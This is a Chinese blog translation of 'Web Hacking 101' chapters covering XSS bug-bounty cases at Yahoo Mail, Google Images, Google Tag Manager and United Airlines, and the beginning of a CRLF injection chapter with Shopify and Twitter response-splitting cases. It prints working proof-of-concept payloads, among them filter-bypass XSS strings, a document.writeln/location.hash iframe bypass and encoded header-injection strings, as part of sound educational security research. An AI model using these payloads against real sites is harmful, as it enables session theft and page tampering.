</p><p>通过修改输入的文本来清理用户输入有时会导致漏洞。在这个例子中，雅虎！邮件编辑器允许人们使用<code>&lt;img&gt;</code>标签，使用HTML在电子邮件中嵌入图像。编辑器通过删除任何JavaScript属性（如onload、onerror等）来清理数据，以避免XSS漏洞。但是，它未能避免用户故意提交格式错误的<code>&lt;img&gt;</code>标记时出现的漏洞。        </p><p>大多数HTML标记有属性，这些属性是关于HTML标记的附加信息。例如 <code>&lt;img&gt;</code>标记需要一个指向要显示的图像地址的<code>src</code>属性。标记还使用width和height属性定义图像的大小。 一些HTML属性是布尔属性：当它们包含在HTML标记中时，它们被认为是真的，当它们被忽略时，它们被认为是假的。Jouko Pynnonen发现如果他用一个值向HTML标记添加布尔属性，Yahoo！邮件将删除该值，但保留属性的等号。下面是Pynnonen的一个例子：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INPUT</span> <span class="token attr-name">TYPE</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">CHECKED</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hello<span class="token punctuation">"</span></span> <span class="token attr-name">NAME</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>check box<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，HTML输入标记可能包含一个<code>CHECKED</code>属性，指示是否应将复选框呈现为CHECKED off。基于Yahoo的标签解析，该行将变成：       </p><p> <code>&lt;INPUT TYPE=“checkbox”CHECKED=NAME=“checkbox”&gt; </code>       这看起来是无害的，但是HTML允许在未引用的属性值的等号周围有零个或多个空格字符。因此，浏览器将其读为<code>CHECKED</code>，值为<code>NAME=“check</code>，输入标记有第三个名为<code>box</code>的属性，但没有值。        </p><p>为了利用此漏洞，Pynnonen提交了以下<code>&lt;img&gt;</code>标记：  </p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">ismap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>xxx<span class="token punctuation">'</span></span> <span class="token attr-name">itemtype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>yyy style=width:100%;height:100%;position:fixed;  left:0px;top:0px; onmouseover=alert(/XSS/)//<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>雅虎！邮件更改为以下内容：   </p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;img ismap= itemtype='yyy' style=width:100%;height:100%;position:fixed;left:  0px;top:0px; onmouseover=alert(/XSS/)//&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ismap值是一个布尔<code>&lt;img&gt;</code>标记属性，指示图像是否具有可单击区域。在这种情况下，雅虎！删除了<code>“xxx”</code>，并将字符串末尾的单引号移到<code>yyy</code>结尾。        </p><p>有时，站点的后端将是一个黑盒，您将不知道如何处理代码，如本例所示。我们不知道为什么<code>“xxx”</code>被删除，或者为什么单引号被移到<code>yyy</code>结尾。        </p><p>由于代码的处理方式，呈现了一个高度和宽度为100%的<code>&lt;img&gt;</code>标记，使图像占据了整个浏览器窗口。当用户将鼠标移到web页面上时，XSS payload将执行，因为注入的<code>onmouseover=alert（/XSS/）</code>部分。        </p><p><strong>重点</strong>     </p><p>当站点通过修改而不是编码或转义值来清理用户输入时，应继续测试站点的服务器端逻辑。想想开发人员可能是如何编写解决方案的，以及他们做了哪些假设。例如，检查开发人员是否考虑了如果提交了两个<code>src</code>属性，或者空格被斜杠替换时会发生什么情况。在本例中，检查当布尔属性与值一起提交时会发生什么。 </p><p>​       </p><h3 id="谷歌图片搜索"><a href="#谷歌图片搜索" class="headerlink" title="谷歌图片搜索"></a>谷歌图片搜索</h3><p>难度：中等        </p><p>网址：<code>images.google.com/</code></p><p>来源：https：//mahmoudsec.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html<br>报告日期：2015年9月12日<br>赏金支付：未公开<br>根据输入的显示的位置，您不必总是使用特殊字符来利用XSS漏洞。 2015年9月，Mahmoud Jamal使用Google图片查找了其HackerOne个人资料的图片。在浏览时，他注意到Google提供的图片URL<code> http://www.google.com/imgres?imgurl=https://lh3.googleuser.com/</code>。<br>Jamal注意到URL中对<code>imgurl</code>的引用，他意识到他可以控制参数的值。它可能会作为链接出现在页面上。将鼠标悬停在其个人资料的缩略图上时，Jamal确认<code>&lt;a&gt;</code>标签<code>href</code>属性包含相同的URL。他尝试将<code>imgurl</code>参数更改为<code>javascript:alert(1)</code>，并注意到<code>href</code>属性也更改为相同的值。</p><p>当特殊字符被清理的网站中，此<code>javascript:alert(1)</code>非常有用，因为此payload不包含网站要转码的特殊字符。单击指向<code>javascript:alert(1)</code>的链接时，将打开一个新的浏览器窗口，并执行alert。另外，由于JavaScript是在包含链接的原来的网页的上下文中执行，因此JavaScript可以访问该页面的DOM。换句话说，指向<code>javascript:alert(1)</code>的链接将在Google执行alert函数。此结果表明，恶意攻击者可能可以访问网页上的信息。如果单击指向JavaScript协议的链接没有继承显示该链接的原来的站点的上下文，则XSS将无害：攻击者无法访问易受攻击的网页的DOM。</p><p>激动的是，Jamal点击了他认为是他的恶意链接的链接，但没有执行任何JavaScript。当他单击通过<code>&lt;a&gt;</code>标记的<code>onmousedown</code> JavaScript属性，Google已清理了URL地址。</p><p>作为解决方法，Jamal尝试在页面上查找。当他到达“查看图像”按钮时，按了ENTER键，触发JavaScript，因为他无需单击鼠标即可访问链接。</p><p><strong>重点</strong><br>注意可能显示在页面上的URL参数，因为您可以控制这些值。如果找到在页面上出现的任何URL参数，请同时考虑它们的上下文。 URL参数可能会提供绕过删除特殊字符的过滤器的机会。在此示例中，Jamal无需提交任何特殊字符，因为该值已在标记中显示为href属性。<br>此外，即使是Google和其他著名大型网站上也可以找到漏洞。不要简单认为因为一家公司庞大，它的所有漏洞都已被发现。显然，并非总是如此。</p><h3 id="Google跟踪代码管理器存储的XSS"><a href="#Google跟踪代码管理器存储的XSS" class="headerlink" title="Google跟踪代码管理器存储的XSS"></a>Google跟踪代码管理器存储的XSS</h3><p>难度：中等<br>网址：<code>tagmanager.google.com/</code><br>资料来源：<a href="https://blog.it-securityguard.com/bugbounty-the-5000-google-xss/">https://blog.it-securityguard.com/bugbounty-the-5000-google-xss/</a><br>报告日期：2014年10月31日<br>赏金支付：$ 5,000</p><p>网站的常见最佳做法是在在用户输入时对其进行清理，而不是在提交进行保存时候。原因是引入新的方法将数据提交到网站（例如文件上传），很容易忘记清理输入内容。但是，在某些情况下，公司不会采用这种做法：HackerOne的Patrik Fehrenbach于2014年10月在测试Google的XSS漏洞时发现了这一失误。</p><p>Google跟踪代码管理器是一个SEO工具，营销人员可以轻松添加和更新网站代码。<br>为此，该工具具有许多与用户交互的Web表单。 Fehrenbach首先查找可用的表单字段并输入XSS payload，例如<code>＃“&gt; &lt;img src = /onerror = alert(3)&gt;</code>。如果payload被表单字段接受，则payload将闭合现有的HTML标记，然后尝试加载不存在的图像，因为找不到该图像，因此网站将执行 JavaScript“onerror”函数执行alert（3）。</p><p>但Fehrenbach的payload无法正常工作。 Google正确地清理了他的输入。Fehrenbach注意到另一种提交payload的方法。除了表单字段外，Google还提供了上传带有多个标签的JSON文件的功能。因此，Fehrenbach将以下JSON文件上传到Google的服务中：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">"data": {  "name": "#"&gt;&lt;img src=/ onerror=alert(3)&gt;",  "type": "AUTO_EVENT_VAR",  "autoEventVarMacro": {  "varType": "HISTORY_NEW_URL_FRAGMENT"  } }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请注意，name属性的值与Fehrenbach之前尝试过的XSS payload相同。 Google并未遵循最佳做法——在提交时而不是在显示时清除来自Web表单的输入。结果，Google忘记清理文件上传中的输入，因此执行了Fehrenbach的payload。</p><p><strong>重点</strong><br>Fehrenbach的报告中有两个细节值得注意。首先，Fehrenbach为他的XSS payload找到了一种替代输入法。您还应该寻找其他输入法。确保测试目标提供的用于输入的所有方法，因为处理每个输入的方式可能不同。其次，谷歌应该在输入时候，而不是在渲染时进行清理。 Google可以通过遵循最佳做法来预防此漏洞。即使您知道网站开发人员通常针对某些攻击使用常见的对策，也请检查漏洞。开发人员可能会犯错误。</p><h3 id="联合航空XSS"><a href="#联合航空XSS" class="headerlink" title="联合航空XSS"></a>联合航空XSS</h3><p>难度：难</p><p>网址：<code>checkin.united.com/</code></p><p>资料来源：<a href="http://strukt93.blogspot.jp/2016/07/united-to-xss-[united.html](http://strukt93.blogspot.jp/2016/07/united-to-xss-united.html)">http://strukt93.blogspot.jp/2016/07/united-to-xss-[united.html](http://strukt93.blogspot.jp/2016/07/united-to-xss-united.html)</a></p><p> 2016年7月，在搜寻廉价航班时，穆斯塔法·哈桑（Mustafa Hasan）开始在联合航空网站上寻找错误。 他发现访问子域<code>checkin.united.com</code>重定向到包含<code>SID</code>参数的URL。 他注意到传递给该参数的任何值都在页面HTML中呈现，因此他测试了<code>“&gt; &lt;svg onload = confirm（1）&gt;</code>。如果有漏洞，该标记将闭合现有的HTML标记并注入Hasan的<code>&lt;svg&gt;</code>标记，从而由<code>onload</code>事件的JavaScript弹出窗口。</p><p>但是，当他提交HTTP请求时，没有任何反应，尽管他的payload没有经过清理，是按原样出现的。 Hasan并没有放弃，而是使用浏览器的开发工具打开了该网站的JavaScript文件。 他找到了以下代码，该代码覆盖了可能导致XSS的JavaScript属性，例如alert，confirm，prompt和write属性：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*XSS prevention via JavaScript*/</span><span class="token keyword">var</span> XSSObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function-variable function">lockdown</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span>name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>startsWith<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Object<span class="token punctuation">.</span>defineProperty<span class="token punctuation">)</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token punctuation">{</span>configurable<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token constant">X</span>SSObject<span class="token punctuation">.</span><span class="token function-variable function">proxy</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> name<span class="token punctuation">,</span>report_function_name<span class="token punctuation">,</span> ➊exec_original</span><span class="token punctuation">)</span><span class="token punctuation">{</span> var proxy <span class="token operator">=</span> obj<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>obj<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>exec_original<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">proxy</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token constant">X</span>SSObject<span class="token punctuation">.</span><span class="token function">lockdown</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>➋ XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'alert'</span><span class="token punctuation">,</span> <span class="token string">'window.alert'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'confirm'</span><span class="token punctuation">,</span> <span class="token string">'window.confirm'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'prompt'</span><span class="token punctuation">,</span> <span class="token string">'window.prompt'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">'unescape'</span><span class="token punctuation">,</span> <span class="token string">'unescape'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">,</span> <span class="token string">'document.write'</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>XSSObject<span class="token punctuation">.</span><span class="token function">proxy</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">'fromCharCode'</span><span class="token punctuation">,</span><span class="token string">'String.fromCharCode'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即使您不了解JavaScript，也可以通过使用某些单词来猜测发生了什么。例如，XSSObject proxy定义中的exec_original参数名称暗示了执行某函数。在参数的下面是函数的列表，以及传递的值false（最后一个实例除外）。我们可以假定该站点试图通过禁止执行传递给XSSObject proxy的JavaScript属性来保护自己。</p><p>值得注意的是，JavaScript允许您覆盖现有函数。因此，Hasan首先尝试通过在SID中添加以下值来还原document.write函数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">javascript：document<span class="token punctuation">.</span>write <span class="token operator">=</span> <span class="token class-name">HTMLDocument</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>write<span class="token punctuation">;</span> document<span class="token punctuation">.</span>write（<span class="token string">'STRUKT'</span>）<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该值通过使用write函数的原型将文档的write设置为其原函数。因为JavaScript是面向对象的，所以所有对象都有原型。通过调用HTMLDocument，Hasan将当前文档的write函数设置回HTMLDocument的原始实现。然后，他调用document.write（’STRUKT’）将其纯文本名称添加到页面中。</p><p>但是，当Hasan尝试利用此漏洞时，他再次陷入困境。他向Rodolfo Assis寻求帮助。他们一起工作，意识到联合航空网站的XSS过滤器缺少类似于write的函数：writeIn函数。这两个函数的区别在于，writeln在写入文本后添加了换行符，而write则没有。</p><p>Assis相信他可以使用writeln函数将内容写入HTML文档。这样做可以让他绕过联合航空网站的XSS过滤器。他使用以下有payload执行此操作：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">";}{document.writeln(decodeURI(location.hash))-"</span>#<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是他的JavaScript仍然没有执行，因为XSS过滤器仍在加载和重写alert函数：Assis需要使用不同的方法。在我们研究最后的payload以及Assis如何绕过alert覆盖之前，让我们先分解他的初始payload。</p><p>第一个部分，<code>“;}</code>，闭合原有的JavaScript。接下来，<code>{</code>开始JavaScript payload，document.writeln调用JavaScript document对象的writeln函数将内容写入DOM。传递给writeln的decodeURI函数解码URL中的编码实体（例如，<code>%22</code>将变为<code>“</code>）。传递给decodeURI的<code>location.hash</code>代码返回URL中<code>#</code>后面的所有参数。完成此初始设置后，<code>-“</code>将替换payload开头的引号，以确保正确的JavaScript语法。   </p><p>最后,<code>#&lt;img src=1 onerror=alert（1）&gt;</code>，添加了一个从未发送到服务器的参数。最后一部分是URL的一个定义的可选部分，称为fragment，它是指document的一部分。但在本例中，Assis使用一个fragment来利用定义fragment开头的hash（#）。对<code>location.hash</code>的引用返回<code>#</code>之后的所有内容。但是返回的内容将是URL编码的，因此输入<code>&lt;img src=1 onerror=alert（1）&gt;</code>将作为<code>%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%20</code>返回。为了解决编码问题，函数decodeURI将内容解码回<code>HTML&lt;img src=1 onerror=alert（1）&gt;</code>。这一点很重要，因为解码后的值被传递给writeln函数，该函数将HTML<code>&lt;img&gt;</code>标记写入DOM。当站点找不到标记的<code>sr</code>c属性中引用的图像<code>1</code>时，HTML标记执行XSS。如果payload成功，将弹出一个JavaScript alert框，其中包含数字1。但没有。       </p><p> Assis和Hasan意识到他们需要一个联合航空网站上下文中的新HTML document：他们需要一个没有加载XSS过滤器JavaScript的页面，但是仍然可以访问联合航空网站网页信息、cookies等。所以他们使用了一个iFrame，它的payload如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">";}{document.writeln(decodeURI(location.hash))-"</span>#<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>iframe<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此有payload的行为与带有<code>&lt;img&gt;</code>标记的原始URL类似。但在这篇文章中，他们给DOM写了一个<code>&lt;iframe&gt;</code>，并更改了<code>src</code>属性，使用<code>javaScript:alert(document.domain）</code>。此payload类似于“Google图像搜索”中讨论的XSS漏洞，因为JavaScript方案继承父DOM的上下文。现在XSS可以访问联合航空网站的DOM，于是<code>document.domain</code>显示了<code>www.United.com</code>。当站点弹出alert时，已确认该漏洞存在。       </p><p> iFrame可以使用source属性来拉入远程HTML。因此，Assis可以将源代码设置为JavaScript，JavaScript会立即document domain的<code>alert</code>函数。        </p><p><strong>重点</strong></p><p>请注意有关此漏洞的三个重要详细信息。首先，Hasan坚持不懈的精神。他并没有在payload不会触发时放弃，而是深入JavaScript来找出原因。第二，使用JavaScript属性黑名单应该告诫黑客，XSS bug可能存在于代码中，因为它们提供了开发者错误的可能。第三，掌握JavaScript知识对于成功确认更复杂的漏洞至关重要。       </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 对于站点开发人员来说，XSS漏洞是真正的风险，并且仍然在站点上普遍存在，通常是显而易见的。通过提交恶意payload，如<code>&lt;img src=x onerror=alert（document.domain）&gt;</code>，可以检查输入字段是否易受攻击。但这并不是测试XSS漏洞的唯一方法。任何时候，站点通过修改（通过删除字符、属性等）来清理输入时，都应该彻底测试清理功能。寻找站点在提交时而不是在显示输入时清理输入的机会，并测试所有输入方法。另外，查找您控制的反映在页面上的URL参数；这些参数可能允许您找到可以绕过编码的XSS攻击，例如将<code>javascript:alert（document.domain</code>）添加到anchor标记中的<code>ref</code>值。        </p><p>很重要的一点是要考虑一个站点显示输入的所有地方，以及它是用HTML还是JavaScript。请记住，XSS payload可能不会立即执行。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part6 CRLF注入</title>
      <link href="part6-crlf-zhu-ru/"/>
      <url>part6-crlf-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="Part6-CRLF注入"><a href="#Part6-CRLF注入" class="headerlink" title="Part6 CRLF注入"></a><center>Part6 CRLF注入</center></h1><p> <font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>某些漏洞使用户可以输入在HTML和HTTP响应中具有特殊含义的编码字符。通常，应用程序会在将这些字符包含在用户输入中时对它们进行清理，以防止攻击者恶意操纵HTTP消息，但在某些情况下，应用程序会忘记对输入进行清理或无法正确进行清理。发生这种情况时，服务器，代理和浏览器可能会将特殊字符解释为代码，并更改原来的HTTP消息，从而使攻击者能够操纵应用程序的行为。</p><p>编码字符的两个示例为％0D和％0A，它们分别表示\ n（回车）和\ r（换行）。这些编码的字符通常称为回车换行符（CRLF）。服务器和浏览器依靠CRLF字符来标识HTTP消息的各个部分，例如头。</p><p>当应用程序没有清理用户输入或不正确地清理用户输入时，就会出现回车换行注入（CRLF注入）漏洞。如果攻击者可以将CRLF字符注入HTTP消息，则他们可以实现我们将在本章中讨论的两种类型的攻击：HTTP请求走私和HTTP响应拆分攻击。此外，您通常可以将CRLF注入与另一个漏洞链接在一起，以在Bug报告中显示更大的影响，这将在本章的后面进行演示。</p><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2><p>当攻击者利用CRLF注入漏洞将第二个HTTP请求附加到初始合法请求时，就会发生HTTP请求走私。因为应用程序没有预期注入的CRLF，所以它最初将两个请求视为一个请求。该请求通过接收服务器（通常是代理服务器或防火墙）传递，处理，然后发送到另一台服务器，例如代表站点执行操作的应用程序服务器。此类漏洞可能导致缓存中毒，防火墙规避，请求劫持或HTTP响应拆分。</p><p>在缓存中毒中，攻击者可以更改应用程序缓存中的条目，从而导致恶意网页代替了原来的合法网页。使用CRLF制作请求以避免安全检查时，会发生防火墙规避。在请求劫持的情况下，攻击者可以窃取httponly cookie和HTTP身份验证信息，而无需与攻击者和客户端进行交互。这些攻击之所以起作用，是因为服务器将CRLF字符解释为HTTP标头开始位置的指示符，因此，如果它们看到另一个标头，则将其解释为新HTTP请求的开始。</p><p>我们将在本章的其余部分集中讨论HTTP响应拆分，它允许攻击者通过注入浏览器解释的新标头来拆分单个HTTP响应。攻击者可以根据漏洞的性质使用两种方法之一利用拆分的HTTP响应。使用第一种方法，攻击者使用CRLF字符来完成初始服务器响应，并插入其他标头以生成新的HTTP响应。但是，有时攻击者只能修改响应，而不能注入全新的HTTP响应。例如，他们只能注入有限数量的字符。这导致了利用响应拆分的第二种方法，即插入新的HTTP响应标头，例如Location标头。注入Location标头可以使攻击者利用重定向链接CRLF漏洞，将目标发送到恶意网站或跨站点脚本（XSS）。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><h3 id="v-shopify-com响应拆分"><a href="#v-shopify-com响应拆分" class="headerlink" title="v.shopify.com响应拆分"></a>v.shopify.com响应拆分</h3><p>难度：中等</p><p>网址：<code>v.shopify.com/last_shop？&lt;YOURSITE&gt; .myshopify.com</code></p><p>资料来源：<a href="https://hackerone.com/reports/106427/">https://hackerone.com/reports/106427/</a></p><p>报告日期：2015年12月22日</p><p>赏金支付：$ 500</p><p>2015年12月，HackerOne用户krankopwnz报告说Shopify没有验证传递给网址<code>v.shopify.com/last_shop?&lt;YOURSITE&gt;.myshopify.com</code>的<code>last_shop</code>参数。 Shopify向此URL发送了GET请求，以便设置一个cookie，该cookie记录了用户登录的最后一个商店。攻击者可以在<code>last_shop</code>参数中将CRLF字符<code>％0d％0a</code>（大小写与编码无关）包含在URL中。提交这些字符后，Shopify将使用完整的<code>last_shop</code>参数在HTTP响应中生成新的标头。这是作为商店名称一部分注入的恶意代码，用于测试此漏洞是否有效：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20 text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>deface<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于Shopify使用未经清理的<code>last_shop</code>参数在HTTP响应中设置cookie，因此该响应包含浏览器解释为两个响应的内容。字符<code> ％20</code>表示已编码的空格，在接收到响应时将对它们进行解码。</p><p>浏览器收到的响应被解码为：</p><pre class="line-numbers language-none"><code class="language-none">➊ Content-Length: 0   HTTP/1.1 200 OK   Content-Type: text/html   Content-Length: 19 ➋ &lt;html&gt;deface&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>响应的第一部分将出现在原始HTTP标头之后。原始响应的内容长度声明为0➊，这表明浏览器响应主体中没有内容。接下来，CRLF开始新行和新标题。文本设置了新的标题信息，以告知浏览器还有第二个响应，即HTML，其长度为19。然后，标题信息为浏览器提供了HTML，以➋呈现。当恶意攻击者使用注入的HTTP标头时，可能会出现多种漏洞；其中包括XSS。</p><p><strong>重点</strong></p><p>寻找用作返回头的一部分的输入，尤其是在设置Cookie时。如果您在网站上看到此行为，请尝试提交<code>％0D％0A</code>（或在Internet Explorer中仅为<code>％0A％20</code>），以检查该网站是否正确地防止了CRLF注入。如果不是，请测试您是否能够添加新的标头或整个附加的HTTP响应。如果几乎没有用户交互，例如在GET请求中发生此漏洞，则最好利用此漏洞。</p><h3 id="Twitter-HTTP响应拆分"><a href="#Twitter-HTTP响应拆分" class="headerlink" title="Twitter HTTP响应拆分"></a>Twitter HTTP响应拆分</h3><p>难度：高</p><p>网址：<code>https://twitter.com/i/safety/report_story/</code></p><p>资料来源：<a href="https://hackerone.com/reports/52042/">https://hackerone.com/reports/52042/</a></p><p>报告日期：2015年3月15日</p><p>赏金支付：$ 3,500</p><p>在某些情况下，站点使用黑名单来防止CRLF注入。换句话说，站点将检查输入中是否有任何列入黑名单的字符，然后通过删除这些字符或不允许进行HTTP请求来做出相应的响应。但是，攻击者有时可以使用字符编码来规避黑名单。</p><p>2015年3月，FileDescriptor操纵Twitter如何处理字符编码，以查找允许他通过HTTP请求设置cookie的漏洞。</p><p>FileDescriptor测试的HTTP请求在发送到<code>https://twitter.com/i/safety/report_story/</code>（允许用户报告不当广告的Twitter页面）时，它包含一个reported_tweet_id参数。在它的响应中，Twitter还将返回一个cookie，其中包含与HTTP请求一起提交的参数。在测试期间，FileDescriptor指出CR和LF字符已被列入黑名单并进行了清理。 Twitter将用空格替换所有LF，并在收到任何CR时发回HTTP 400，从而防止CRLF注入。但是FileDescriptor知道一个Firefox漏洞，该漏洞错误地解码了cookie，并可能允许用户向网站注入恶意payload。他测试了Twitter上是否可能存在类似的漏洞。</p><p>在Firefox漏洞中，Firefox会删除ASCII字符范围之外的cookie中的所有Unicode字符。但是，Unicode字符可以包含多个字节。如果去除了多字节字符中的某些字节，则剩余的字节可能会导致在网页上呈现恶意字符。</p><p>受Firefox漏洞启发，FileDescriptor测试了攻击者是否可以使用相同的多字节字符技术通过Twitter的黑名单。因此，FileDescriptor找到了一个Unicode字符，其编码以％0A（LF）结尾，但其其他字节未包含在HTTP字符集中。他使用了Unicode字符，该字符以十六进制编码为U + 560A（56 0A）。但是，当在URL中使用此字符时，它是使用UTF-8编码为<code>％E5％98％8A</code>的URL。 ％E5，％98，％8A这三个字节绕过了Twitter的黑名单，因为它们不是恶意字符。</p><p>当FileDescriptor提交此值时，他发现Twitter不会清除URL编码的字符，但仍会将UTF-8<code>％E5％98％8A</code>值解码回其Unicode值<code>56 0A</code>。 Twitter会将56删除(无效字符)，而换行字符0A保持不变。此外，他发现该字符（编码为<code>56 0D</code>）也可以用于在HTTP响应中插入必要的回车符（<code>％0D</code>）。</p><p>一旦他确认该方法有效，FileDescriptor将值<code>％E5％98％8A％E5％98％8DSet-Cookie：％20test</code>传递到Twitter的URL参数中。 Twitter将对字符进行解码，去除超出范围的字符，并将<code>％0A</code>和<code>％0D</code>保留在HTTP请求中，从而得到值<code>％0A％0DSet-Cookie：％20test</code>。 CRLF将HTTP响应分为两部分，因此第二个响应仅由<code>Set-Cookie：test</code>组成，它是用于设置cookie的HTTP标头。</p><p>如果CRLF攻击允许XSS攻击，则可能更加危险。 